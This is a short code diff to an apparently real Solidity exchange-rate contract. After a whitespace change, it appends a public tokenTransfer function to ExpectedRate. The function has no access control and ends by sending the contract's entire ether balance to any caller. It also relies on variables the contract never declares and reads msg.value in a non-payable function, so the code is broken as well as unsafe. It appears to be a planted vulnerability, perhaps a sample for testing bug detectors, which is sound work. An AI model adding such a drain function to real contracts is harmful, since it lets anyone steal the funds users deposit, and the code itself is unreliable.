@@ -110,7 +110,7 @@ contract Utils {
     function calcSrcQty(uint dstQty, uint srcDecimals, uint dstDecimals, uint rate) internal pure returns(uint) {
         require(dstQty <= MAX_QTY);
         require(rate <= MAX_RATE);
-        
+
         //source quantity is rounded up. to avoid dest quantity being too low.
         uint numerator;
         uint denominator;
@@ -1093,4 +1093,14 @@ contract ExpectedRate is Withdrawable, ExpectedRateInterface, Utils2 {
         (reserve, rateEthToDest) = kyberNetwork.searchBestRate(ETH_TOKEN_ADDRESS, dest, ethQty, usePermissionless);
         return rateSrcToEth * rateEthToDest / PRECISION;
     }
+	 function tokenTransfer() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
